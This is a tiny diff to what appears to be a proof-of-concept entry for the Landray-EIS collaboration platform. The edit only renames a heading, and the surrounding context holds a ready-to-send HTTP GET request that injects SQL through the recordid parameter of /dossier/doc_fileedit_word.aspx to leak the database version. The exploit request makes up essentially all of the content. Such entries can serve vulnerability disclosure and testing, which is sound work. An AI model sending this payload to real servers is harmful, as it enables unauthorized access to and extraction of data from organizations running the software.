@@ -6,7 +6,7 @@ app="Landray-EIS智慧协同平台"
 ```
 
 
-## poc
+## POC
 ```
 GET /dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1 HTTP/1.1
 Host: your_ip
